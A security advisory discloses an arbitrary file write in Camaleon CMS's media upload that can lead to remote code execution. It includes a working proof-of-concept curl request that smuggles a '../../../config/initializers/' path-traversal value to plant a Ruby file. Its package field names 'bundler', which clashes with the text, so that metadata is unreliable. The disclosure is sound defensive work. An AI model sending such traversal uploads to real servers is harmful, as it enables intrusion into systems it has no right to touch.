# Arbitrary file write to RCE (GHSL-2024-182)

Critical

[owen2345](/owen2345)
published
GHSA-wmjg-vqhv-q5p5
Sep 18, 2024

## Package

bundler

2.8.0
([RubyGems](/advisories?query=ecosystem%3Arubygems))

## Affected versions

2.8.0

## Patched versions

2.8.2

## Description

An arbitrary file write vulnerability accessible via the upload method of the MediaController allows authenticated users to write arbitrary files to any location on the web server Camaleon CMS is running on (depending on the permissions of the underlying filesystem). E.g. This can lead to a delayed remote code execution in case an attacker is able to write a Ruby file into the config/initializers/ subfolder of the Ruby on Rails application.

Once a user upload is started via the [upload](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/controllers/camaleon_cms/admin/media_controller.rb#L86-L87) method, the file\_upload and the folder parameter

```
def upload(settings = {})
  params[:dimension] = nil if params[:skip_auto_crop].present?
  f = { error: 'File not found.' }
  if params[:file_upload].present?
    f = upload_file(params[:file_upload],
                    { folder: params[:folder], dimension: params['dimension'], formats: params[:formats], versions: params[:versions],
                      thumb_size: params[:thumb_size] }.merge(settings))
  end
  [..]
end
```

are passed to the [upload\_file](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L23-L24) method. Inside that method the given settings are [merged](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L41-L42) with some presets. The file format is [checked against](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L61-L62) the formats settings we can override with the formats parameters.

```
# formats validations
  return { error: "#{ct('file_format_error')} (#{settings[:formats]})" } unless cama_uploader.class.validate_file_format(
    uploaded_io.path, settings[:formats]
 )
```

Our given folder is then [passed unchecked](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L73-L74) to the Cama\_uploader:

```
key = File.join(settings[:folder], settings[:filename]).to_s.cama_fix_slash
res = cama_uploader.add_file(settings[:uploaded_io], key, { same_name: settings[:same_name] })
```

In the [add\_file](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/uploaders/camaleon_cms_local_uploader.rb#L77) method of CamaleonCmsLocalUploader this key argument containing the unchecked path is then used to write the file to the file system:

```
def add_file(uploaded_io_or_file_path, key, args = {})
  [..]
  upload_io = uploaded_io_or_file_path.is_a?(String) ? File.open(uploaded_io_or_file_path) : uploaded_io_or_file_path
  File.open(File.join(@root_folder, key), 'wb') { |file| file.write(upload_io.read) }
  [..]
end
```

Proof of concept

Precondition: A valid account of a registered user is required. (The values for auth\_token and \_cms\_session need to be replaced with authenticated values in the curl command below)

curl --path-as-is -i -s -k -X $'POST'

-H $'User-Agent: Mozilla/5.0' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary80dMC9jX3srWAsga' -H $'Accept: */*' -H $'Connection: keep-alive'

-b $'auth\_token=[..]; \_cms\_session=[..]'

--data-binary $'------WebKitFormBoundary80dMC9jX3srWAsga\x0d\x0aContent-Disposition: form-data; name="file\_upload"; filename="test.rb"\x0d\x0aContent-Type: text/x-ruby-script\x0d\x0a\x0d\x0aputs "================================="\x0aputs "================================="\x0aputs "= COMPROMISED ="\x0aputs "================================="\x0aputs "================================="\x0d\x0a------WebKitFormBoundary80dMC9jX3srWAsga\x0d\x0aContent-Disposition: form-data; name="folder"\x0d\x0a\x0d\x0a../../../config/initializers/\x0d\x0a------WebKitFormBoundary80dMC9jX3srWAsga\x0d\x0aContent-Disposition: form-data; name="skip\_auto\_crop"\x0d\x0a\x0d\x0atrue\x0d\x0a------WebKitFormBoundary80dMC9jX3srWAsga--\x0d\x0a'

$'https:///admin/media/upload?actions=false'

Note that the upload form field formats was removed so that Camaleon CMS accepts any file. The folder was set to ../../../config/initializers/so that following Ruby script is written into the initializers folder of the Rails web app:

puts "================================="

puts "================================="

puts "= COMPROMISED ="

puts "================================="

puts "================================="

Once Camaleon CMS is restarted following output will be visible in the log:

### COMPROMISED

Impact

This issue may lead up to Remote Code Execution (RCE) via arbitrary file write.

Remediation

Normalize file paths constructed from untrusted user input before using them and check that the resulting path is inside the targeted directory. Additionally, do not allow character sequences such as .. in untrusted input that is used to build paths.
